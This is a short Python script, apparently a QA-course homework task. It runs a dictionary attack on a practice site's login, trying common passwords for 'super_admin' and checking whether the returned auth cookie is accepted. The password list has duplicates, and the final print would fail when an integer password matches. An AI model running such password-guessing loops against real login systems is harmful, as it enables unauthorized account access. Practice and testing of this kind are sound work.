import requests

list_pass = ['password', 123456, 123456789, 12345678, 12345, 123456789, 'qwerty', 'abc123', 'football', 1234567,
                     'monkey', 111111, 'letmein', 1234, 1234567890, 'dragon', 'baseball', 'sunshine', 'iloveyou',
                     'trustno1', 'princess', 'adobe123[a]', 123123, 'welcome', 'login', 'admin', 'qwerty123', 'solo',
                     '1q2w3e4r', 'master', 666666, 'photoshop[a]', '1qaz2wsx', 'qwertyuiop', 'ashley', 121212,
                     'starwars', 654321, 'bailey', 'access', 'flower', 555555, 'passw0rd', 'shadow', 'lovely', 654321,
                     7777777, '!@#$%^&*', 654321, 'jesus', 'password1', 'superman', 'hello', 'charlie', 888888, 696969,
                     'hottie', 'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald',
                     'michael', 'mustang', 'batman', 'zaq1zaq1', 'qazwsx', 'Football', 000000, '123qwe']

for i in list_pass:
    payload = {"login": "super_admin", "password": f"{i}"}
    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    response = requests.post(url, data=payload)
    auth_cookie = response.cookies.get("auth_cookie")
    payload2 = {"auth_cookie": f"{auth_cookie}"}
    response2 = requests.post(url2, cookies=payload2)
    if response2.text == "You are authorized":
        print(i + '\n' + response2.text)